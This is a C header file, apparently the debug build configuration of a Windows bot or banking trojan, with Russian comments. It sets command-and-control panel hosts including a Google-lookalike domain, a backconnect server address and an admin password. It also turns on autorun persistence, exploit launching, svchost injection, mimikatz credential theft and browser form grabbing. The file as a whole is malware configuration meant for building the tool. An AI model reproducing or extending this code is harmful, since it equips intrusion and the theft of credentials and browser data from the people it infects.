#pragma once

//дебаг версия 
#include "..\builder.h"

//#define ADMIN_PANEL_HOSTS ""
//#define ADMIN_PANEL_HOSTS "comixed.org"
//#define ADMIN_PANEL_HOSTS "194.146.180.40"
#define ADMIN_PANEL_HOSTS "aaaabbbbccccc.org"
//#define ADMIN_PANEL_HOSTS "stats10-google.com"
#define ADMIN_AZ "admin_az"
#define USER_AZ "admin"
#define VIDEO_SERVER_IP "192.168.0.100:700"
//#define VIDEO_SERVER_IP "80.84.49.50:443"
//#define VIDEO_SERVER_IP "52.11.125.44:443"
//#define FLAGS_VIDEO_SERVER "0000005"
//настройки для бэкконнект сервера
//позиция 0: запускать в отдельном свцхосте или нет
//		  1: запускать или нет в спящем режиме
//		  2-6: через сколько минут бездействия отключаться от сервера
#define FLAGS_VIDEO_SERVER "0000099"
//#define FLAGS_VIDEO_SERVER "1000099"
#define ADMIN_PASSWORD "1He9Psa7LzB1wiRn"
//#define ADMIN_PASSWORD "1234567812345678"
#define PREFIX_NAME "myt"
#define PERIOD_CONTACT "30"
//различные настройки бота
//позиция 0 - отключена или включена инсталяция в автозагрузку
//		  1 - отключен или включен запуск сплойта
//		  2 - включена или отключена проверка запуска копии
//		  3 - плагины закачиваются в сервера (1), иначе с админки (0)
//		  4 - включена или нет работа в запущенном процессе без инжектов в svchost.exe
//#define MISC_STATE "10111"
#define MISC_STATE "10110"

//настройки для отключения разных функций
//отключить установку сервиса
//#define OFF_SERVICE
//#define OFF_SDPROP
//отключить установку в автозапуск (в тот что в меню винды)
//#define OFF_AUTORUN
//при запуске не запускаться в свцхосте
//#define OFF_SVCHOST
//все отсылаемые данные (скриншоты, логи) ложатся в папку c:\botdebug
#define ON_SENDDATA_FOLDER
//все плагины берутся из папки c:\plugins
#define ON_PLUGINS_FOLDER
#define ON_VIDEOSERVER
//при работе не использовать проводник (не инжектится в него)
#define NOT_EXPLORER
//подключение ифобс
//#define ON_IFOBS
//подключение функций из программы mimikatz
#ifndef WIN64
#define ON_MIMIKATZ
#endif
//включает граббинг данных с форм браузера
#define ON_FORMGRABBER

//включение вложенных плагинов
//#define PLUGINS_TRUSTED_HOSTS
//#define PLUGINS_FIND_OUTLOOK_FILES
//после поиска нужно завершить работу бота
//#define PLUGINS_FIND_OUTLOOK_FILES_EXIT
//#define PLUGINS_MONITORING_FILE

//запрашивает IP админки и при получении корректного адреса запускает серверную часть которая коннектится по этому IP
//#define IP_SERVER_FROM_DNS
//стучать на зашитый внешней прогой IP сервера
//#define IP_SERVER_EXTERNAL_IP


//публичный дебаг ключ, вначале идет 2 байт маски, которые налаживаются xor операцией на остальной массив, 3-й байт это длина ключа (будет после декоирования маской)
#define PUBLIC_KEY "\xaa\x8d\xfe\x8b\xa8\x8d\xaa\x8d\x0e\x8d\xaa\xdf\xf9\xcc\x9b\x8d\xa8\x8d\xaa\x8c\xaa\x8c\xaa\x86\x60\x07\xb9\x70\x3b\x69\xd8\x0d\x53\xd2\x44\xb5\x16\xa3\x47\xad\xf7\xd9\xa9\x8f\x04\x5b\x3a\xc6\xc0\xe2\x04\xf3\xac\xb3\x26\x67\x02\x98\xec\x12\x94\x99\x8a\x0b\xe9\xe2\x2d\x32\x04\xca\x62\xda\x5f\x92\x7a\x3a\x8d\xcf\xa4\x5c\xfb\xba\xcf\x9b\x4e\x1e\x61"

#define DATE_WORK "0"
